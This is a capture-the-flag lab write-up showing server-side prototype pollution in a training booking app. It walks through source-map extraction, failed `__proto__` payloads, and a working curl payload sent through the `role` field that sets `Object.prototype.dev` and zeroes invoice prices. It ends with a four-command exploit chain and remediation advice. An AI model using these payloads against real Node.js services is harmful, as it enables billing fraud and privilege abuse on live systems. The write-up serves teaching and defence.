---
title: Galaxy Dash - Prototype Pollution
tags:
  - bugforge
  - prototype-pollution
  - business-logic
  - source-maps
  - burpsuite
  - mcp
---

- Galaxy Dash - a Futurama-themed B2B delivery booking platform

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

### Endpoint Extraction + Source Maps

```bash
# Grab the main JS bundle
curl -sk "$TARGET" | grep -o 'static/js/main\.[a-f0-9]*\.js'
# main.596ac5d8.js

# Download and check for source map directive
curl -sk "$TARGET/static/js/main.596ac5d8.js" | tail -1
# //# sourceMappingURL=main.596ac5d8.js.map

# Download source map and extract original source files
curl -sk "$TARGET/static/js/main.596ac5d8.js.map" | python3 -c "
import json, sys, os
m = json.load(sys.stdin)
for i, name in enumerate(m.get('sources',[])):
    if 'node_modules' not in name:
        path = '/tmp/sm/' + name.split('/')[-1]
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, 'w').write(m['sourcesContent'][i])
        print(f'  [+] {name}')
"
```

- 15 API endpoints
- 11 React components extracted
- Express backend, CORS `*`, HS256 JWT with no expiry.

### Key Source Code Signals

**OrganizationSettings.js:14** - sends a `dev: false` field to the server:

```js
const [formData, setFormData] = useState({
  name: '',
  business_type: '',
  // ...
  dev: false   // <-- why is the client sending this?
});
```

**BookingForm.js:372** - client checks `organization.dev` for free pricing:

```js
<span>{organization?.dev ? '0.00' : priceData.total.toFixed(2)}</span>
```

**TeamManagement.js** -- `PUT /api/team/:userId` accepts a `role` string and nested `permissions` object:

```js
await axios.put(`/api/team/${userId}`, { role, permissions });
```

Checking the org endpoint confirms `dev` is NOT a database column:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/organization"
```

```json
{"id":4,"name":"PhantomOrg Alpha","business_type":"Technology","status":"active","created_at":"..."}
```

No `dev` field. That means if we pollute `Object.prototype.dev = true`, any server-side `org.dev` check inherits it from the prototype chain.

### Step 1 - Register Two Users

```bash
# User A (our main account)
curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker","email":"attacker@test.com","password":"Pass123",
    "full_name":"Attacker","org_name":"AttackerOrg","business_type":"Technology",
    "headquarters_planet":"Earth","headquarters_address":"1 Hack St",
    "contact_email":"attacker@test.com","contact_phone":"+1234","tax_id":"ORG-001"
  }'
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiI...",
  "user": {"id":5,"username":"attacker","role":"org_admin","organizationId":4}
}
```

```bash
# Save the token
TOKEN="eyJhbGciOiJIUzI1NiI..."
```

- JWT: HS256 | `id, username, organizationId, iat` | No `exp` | No role in token (DB-looked-up)
- None-alg bypass: all 4 variants rejected

### Step 2 - Create a Booking (needed for invoice)

```bash
# First, calculate a price so we have valid data
curl -sk -X POST "$TARGET/api/calculate-price" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "origin_location_id":1,"destination_location_id":2,
    "cargo_size":"medium","cargo_weight_kg":500,"danger_level":0,
    "has_insurance":false,"has_premium_tracking":false,"service_id":3
  }'
```

```json
{"breakdown":{"basePrice":"375.00","serviceMultiplier":1},"total":375,"risk":0,"estimatedDeliveryMinutes":1440}
```

```bash
# Create the booking
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "origin_location_id":1,"destination_location_id":2,
    "cargo_size":"medium","cargo_weight_kg":500,"cargo_description":"test delivery",
    "danger_level":0,"has_insurance":false,"has_premium_tracking":false,
    "service_id":3,"total_price":375,"calculated_risk_percent":0,
    "estimated_delivery_minutes":1440
  }'
```

```json
{"id":1,"message":"Booking created successfully","delivery_date":"2026-04-07T..."}
```

### Step 3 - Verify Invoice BEFORE Pollution (baseline)

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1"
```

```json
{
  "invoice_number": "INV-...",
  "subtotal": "375.00",
  "tax": "30.00",
  "total": "405.00"
}
```

Normal pricing. Now we pollute.

## Failed PP Attempts

- Top-level `__proto__` in Express request bodies does NOT pollute -- `body-parser` (which uses `JSON.parse`) treats it as an own property.

```bash
# FAIL: top-level __proto__ on PUT /api/organization
curl -sk -X PUT "$TARGET/api/organization" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"AttackerOrg","__proto__":{"dev":true}}'
# 200 but no behavioral change

# FAIL: constructor.prototype on PUT /api/organization
curl -sk -X PUT "$TARGET/api/organization" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"AttackerOrg","constructor":{"prototype":{"dev":true}}}'
# 200, no effect

# FAIL: __proto__ nested inside permissions on PUT /api/team
curl -sk -X PUT "$TARGET/api/team/5" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"org_admin","permissions":{"can_view_deliveries":true,"__proto__":{"dev":true}}}'
# 200, but WIPED all permissions -- only can_view_deliveries survived

# FAIL: __proto__ on POST /api/register
curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pp_test","email":"pp@test.com","password":"Pass123","org_name":"PP Org","__proto__":{"dev":true}}'
# 200, registered fine, no pollution
```

- None of these endpoints use a vulnerable deep merge on the `__proto__` key.

## The Breakthrough - Type Confusion on `role`

- The `role` field expects a string (`"viewer"`, `"delivery_manager"`, `"org_admin"`).
- The server doesn't validate the type. 
- Sending an **object** instead of a string triggers the deep merge to recurse into it.

### Step 4 - Pollute via role field

```bash
# Get your user ID from the token (or from /api/team response)
MY_USER_ID=5

curl -sk -X PUT "$TARGET/api/team/$MY_USER_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "role": {"__proto__": {"dev": true}},
    "permissions": {
      "can_view_deliveries": true,
      "can_create_deliveries": true,
      "can_edit_deliveries": true,
      "can_manage_team": true,
      "can_manage_org": true
    }
  }'
```

```json
{"message":"User permissions updated successfully"}
```

What happened:
- The server deep-merges the request body into the user update object
- `role` is an object, so the merge recurses into it
- It encounters `__proto__` as a key and assigns `{dev: true}` to `Object.prototype`
- `Object.prototype.dev` is now `true` globally on the server process

### Step 5 -- Verify Pollution via Invoice

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1"
```

```json
{
  "invoice_number": "bug{xQB1DhCdznADql1F8lPjQu7v4lo6RfI9}",
  "booking_id": "1",
  "organization": {"name": "AttackerOrg"},
  "line_items": [
    {"description": "Standard Route: New New York (Earth) > ...", "unit_price": 0, "total": 0},
    {"description": "Cargo: medium (500kg) - test delivery", "unit_price": 0, "total": 0}
  ],
  "subtotal": "0.00",
  "tax": "0.00",
  "total": "0.00"
}
```

- Flag in the `invoice_number`. 
- All prices zeroed out. 
- The server fetches the org from the database - `dev` isn't a column, so `org.dev` walks the prototype chain and finds `true`.

## Why This Worked

The attack chain has three links:

1. **Type confusion**: `role` accepts an object instead of a string - no input validation on type
2. **Vulnerable deep merge**: The server uses a recursive merge (likely `lodash.merge` or similar) that follows `__proto__` as a key
3. **Prototype inheritance**: `dev` is not a DB column, so `org.dev` falls through to `Object.prototype.dev` which we polluted to `true`

- The key insight: you can't detect PP by reading JSON responses. 
- `JSON.stringify` ignores prototype properties. 
- You must test for **behavioural changes** - in this case, the invoice pricing logic.

## TL;DR - Speedrun (4 commands)

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

# 1. Register
TOKEN=$(curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@test.com","password":"Pass123","full_name":"pwn","org_name":"PwnOrg","business_type":"General","headquarters_planet":"Earth","headquarters_address":"x","contact_email":"x@x.com","contact_phone":"0","tax_id":"0"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. Create a booking (need one for the invoice)
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"origin_location_id":1,"destination_location_id":2,"cargo_size":"medium","cargo_weight_kg":500,"cargo_description":"x","danger_level":0,"has_insurance":false,"has_premium_tracking":false,"service_id":3,"total_price":375,"calculated_risk_percent":0,"estimated_delivery_minutes":1440}'

# 3. Pollute Object.prototype.dev via role type confusion
curl -sk -X PUT "$TARGET/api/team/$(python3 -c "import jwt,sys; print(jwt.decode('$TOKEN',options={'verify_signature':False})['id'])")" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":{"__proto__":{"dev":true}},"permissions":{"can_view_deliveries":true,"can_create_deliveries":true,"can_edit_deliveries":true,"can_manage_team":true,"can_manage_org":true}}'

# 4. Read the flag from the invoice
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/1"
```

## Security Takeaways

### Vulnerability

- Server-Side Prototype Pollution via type confusion on the `role` field in `PUT /api/team/:userId`
- The field accepts objects instead of strings, and a vulnerable deep merge function processes nested `__proto__` payloads

### Impact

- Global Object.prototype pollution - affects ALL objects on the server for the lifetime of the process
- Dev mode activation: all invoices generated with $0.00 pricing
- Could cascade to auth bypasses, permission escalation, or DoS depending on what other properties are checked

### Root Cause

- No input type validation on `role` (should reject non-string values)
- Use of a vulnerable deep merge function that recurses into `__proto__`
- Server-side logic checks `org.dev` on objects where `dev` is never an own property (not a DB column)

### Remediation

- Validate input types strictly: `role` must be a string from an allowed set
- Replace vulnerable merge with `Object.assign` (shallow) or a merge function that skips `__proto__` and `constructor` keys
- Freeze prototypes: `Object.freeze(Object.prototype)` as a defense-in-depth measure
- Never rely on the absence of a property to mean `false` -- use explicit checks: `org.hasOwnProperty('dev') && org.dev`
